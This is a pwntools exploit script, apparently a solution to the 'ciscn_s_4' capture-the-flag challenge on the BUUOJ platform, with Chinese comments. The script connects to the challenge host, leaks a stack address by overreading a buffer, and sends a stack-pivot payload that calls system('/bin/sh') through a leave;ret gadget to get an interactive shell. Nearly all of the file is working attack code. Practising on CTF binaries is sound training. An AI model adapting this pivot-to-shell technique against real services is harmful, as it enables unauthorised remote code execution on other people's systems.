from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'ciscn_s_4'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='i386', log_level='debug', endian='little')
'''
stack pivot
'''

payload = 0x28 * b'a'
io.sendafter(b"Welcome, my friend. What's your name?\n", payload)
msg = io.recvline()

leak_stack_addr = msg[0x28+7:0x28+7+4]
leak_stack_addr = u32(leak_stack_addr)

leak_dl_fini_addr = msg[0x28 + 8 +7:0x28+12 +7]
leak_dl_fini_addr = u32(leak_dl_fini_addr)

LOG_ADDR_SUCCESS('leak_stack_addr', leak_stack_addr)
LOG_ADDR_SUCCESS('leak_dl_init_addr', leak_dl_fini_addr)
# print(msg)
buf_addr = leak_stack_addr - 0x38

# libc = LibcSearcher('_dl_fini', leak_dl_fini_addr)
# libc_start_main_addr = leak_dl_fini_addr - 0x1e1a4f - 241
# libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
# libc_base_addr = libc_start_main_addr - libc.dump('__libc_start_main')
# system_addr = libc_base_addr + libc.dump('system')
# str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')

# LOG_ADDR_SUCCESS('libc_base_addr', libc_base_addr)
# LOG_ADDR_SUCCESS('system_addr', system_addr)
# STOP()
# 0x080484b8 : leave ; ret
payload = p32(buf_addr + 0x60) # fake ebp2
payload += p32(io_elf.plt['system']) + p32(io_elf.sym['main']) + p32(buf_addr + 0x20)
payload += 0x10 * b'a' + b'/bin/sh\x00' + p32(buf_addr) + p32(0x80484b8)
io.send(payload)


io.interactive()
